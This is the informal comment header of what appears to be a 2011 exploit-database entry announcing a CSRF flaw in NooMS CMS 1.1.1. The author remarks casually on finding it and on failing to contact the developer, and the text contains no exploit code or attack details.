# NooMS CMS version 1.1.1 CSRF
# Bug Found: April 9th 2011

# Nods to exploit-db Team


# Well, I didn't have much to do this morning so figured I'd try to see how
# fast it would take
# me to find one of these. It's nothing to write home about. I mean...come
# on! Who would use
# a CMS named NooMS? This thing uses a MySQL database as well, wouldn't be
# surprised if
# there are other things to be found.
# But I need to get some chores done before the wife starts.

#
# Enjoy,
# loneferret
#
# p.s:
# I wanted to contact the creator, but he's page (using NooMS) is
# blank... nothing there so.. sorry.
